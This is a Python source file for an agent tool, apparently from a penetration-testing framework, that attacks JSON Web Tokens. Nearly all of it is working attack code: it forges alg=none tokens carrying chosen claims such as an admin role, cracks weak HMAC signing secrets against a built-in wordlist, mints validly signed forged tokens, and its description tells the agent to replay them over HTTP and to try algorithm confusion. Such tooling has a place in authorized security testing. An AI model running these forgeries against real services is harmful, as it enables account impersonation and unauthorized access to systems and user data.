"""JWT attacks — forge alg=none tokens and crack weak HS256 secrets.

Cracking a guessable signing secret is a deterministic win the freeform agent
can't do by hand: once cracked, you can mint a token as any user. This decodes a
JWT, brute-forces the HS* secret against a wordlist, and hands back forged tokens
(alg=none and, when cracked, a validly-signed one with your claims) to replay."""
from __future__ import annotations

import base64
import hashlib
import hmac
import json

from proofmark.tools.base import Tool, ToolResult

_WORDLIST = [
    "secret", "password", "123456", "changeme", "admin", "jwt", "key", "token",
    "your-256-bit-secret", "supersecret", "secretkey", "secret_key", "private",
    "test", "qwerty", "letmein", "password123", "s3cr3t", "jwtsecret", "mysecret",
    "default", "root", "shhhhh", "secret123", "hunter2", "0000", "1234", "access",
    "auth", "signature", "hs256", "app_secret", "api_secret", "jwt_secret",
    "myS3cr3t", "P@ssw0rd", "secretpassword", "topsecret", "iloveyou", "welcome",
]
_DIGEST = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


def _b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def _b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _compact(obj) -> str:
    return json.dumps(obj, separators=(",", ":"))


class JwtAttackTool(Tool):
    name = "jwt_attack_test"
    description = (
        "Attack a JSON Web Token: decode it, forge an alg=none variant (many libraries wrongly "
        "accept it), and brute-force a weak HS256/384/512 signing secret against a common-secret "
        "wordlist. If the secret cracks, you get a validly-signed token with claims you choose — "
        "full impersonation. Pass the token and optional claim overrides (e.g. {\"role\":\"admin\"}); "
        "then replay the forged tokens with http_request to confirm they're accepted."
    )
    parameters = {
        "type": "object",
        "properties": {
            "token": {"type": "string", "description": "The JWT (header.payload.signature)."},
            "claims": {"type": "object", "description": "Claim overrides to bake into the forged token, "
                       "e.g. {\"sub\":\"1\",\"role\":\"admin\",\"admin\":true}."},
        },
        "required": ["token"],
    }

    def run(self, token="", claims=None, **_) -> ToolResult:
        parts = token.strip().split(".")
        if len(parts) != 3:
            return ToolResult("That is not a JWT — expected header.payload.signature.", is_error=True)
        h_b64, p_b64, sig_b64 = parts
        try:
            header = json.loads(_b64url_decode(h_b64))
            payload = json.loads(_b64url_decode(p_b64))
        except Exception:
            return ToolResult("Could not decode the JWT header/payload as JSON.", is_error=True)

        alg = (header.get("alg") or "").upper()
        new_payload = dict(payload)
        if isinstance(claims, dict):
            new_payload.update(claims)

        out = [f"header: {header}", f"payload: {payload}"]
        forged = {}

        # alg=none forgery (empty signature)
        none_token = f"{_b64url(_compact({'alg': 'none', 'typ': 'JWT'}).encode())}." \
                     f"{_b64url(_compact(new_payload).encode())}."
        forged["alg_none"] = none_token
        out.append(f"FORGED alg=none token (replay it — accepted by libraries that don't reject "
                   f"'none'):\n  {none_token}")

        cracked = None
        if alg in _DIGEST:
            digest = _DIGEST[alg]
            signing_input = f"{h_b64}.{p_b64}".encode()
            want = _b64url_decode(sig_b64)
            for secret in _WORDLIST:
                if hmac.compare_digest(hmac.new(secret.encode(), signing_input, digest).digest(), want):
                    cracked = secret
                    break
            if cracked:
                fh = _b64url(_compact(header).encode())
                fp = _b64url(_compact(new_payload).encode())
                fsig = _b64url(hmac.new(cracked.encode(), f"{fh}.{fp}".encode(), digest).digest())
                forged["signed"] = f"{fh}.{fp}.{fsig}"
                out.append(f"WEAK SECRET CRACKED: {cracked!r}. The signing key is guessable, so you "
                           f"can mint valid tokens as anyone. FORGED signed token with your claims:\n"
                           f"  {forged['signed']}")
            else:
                out.append(f"{alg} secret not in the common wordlist — try alg=none, or RS256->HS256 "
                           "algorithm confusion if you have the public key.")

        verdict = "JWT WEAKNESS (critical)" if cracked else "JWT ANALYSIS"
        return ToolResult(verdict + ":\n" + "\n".join(out), data={"forged": forged, "cracked": cracked})
